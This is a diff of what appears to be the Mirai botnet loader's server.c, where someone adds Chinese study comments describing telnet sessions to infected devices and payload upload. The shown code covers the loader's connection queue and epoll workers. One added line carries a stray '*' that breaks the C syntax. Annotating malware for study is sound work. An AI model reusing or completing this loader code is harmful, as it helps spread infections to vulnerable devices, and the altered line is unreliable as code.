@@ -16,10 +16,13 @@
 #include "headers/binary.h"
 #include "headers/util.h"
 //server.c       向感染设备发起telnet交互，上传payload文件
+//loader的主要功能在server.c
+
+//创建srv结构体
 struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip)
 {
-    struct server *srv = calloc(1, sizeof (struct server));
-    struct server_worker *workers = calloc(threads, sizeof (struct server_worker));
+    struct server *srv = calloc(1, sizeof (struct server)); 
+    struct server_worker *workers = calloc(threads, sizeof (struct server_worker)); * 
     int i;
 
     // Fill out the structure
@@ -86,6 +89,8 @@ void server_destroy(struct server *srv)
     free(srv);
 }
 
+
+//判断能否处理新的感染节点
 void server_queue_telnet(struct server *srv, struct telnet_info *info)
 {
     while (ATOMIC_GET(&srv->curr_open) >= srv->max_open)
@@ -100,6 +105,7 @@ void server_queue_telnet(struct server *srv, struct telnet_info *info)
     server_telnet_probe(srv, info);
 }
 
+//处理新的感染节点
 void server_telnet_probe(struct server *srv, struct telnet_info *info)
 {
     int fd = util_socket_and_bind(srv);
@@ -152,6 +158,7 @@ void server_telnet_probe(struct server *srv, struct telnet_info *info)
     epoll_ctl(wrker->efd, EPOLL_CTL_ADD, fd, &event);
 }
 
+
 static void bind_core(int core)
 {
     pthread_t tid = pthread_self();
@@ -162,6 +169,7 @@ static void bind_core(int core)
         printf("Failed to bind to core %d\n", core);
 }
 
+//事件处理线程
 static void *worker(void *arg)
 {
     struct server_worker *wrker = (struct server_worker *)arg;
@@ -181,6 +189,7 @@ static void *worker(void *arg)
     }
 }
 
+//事件处理
 static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 {
     struct connection *conn = wrker->srv->estab_conns[ev->data.fd];
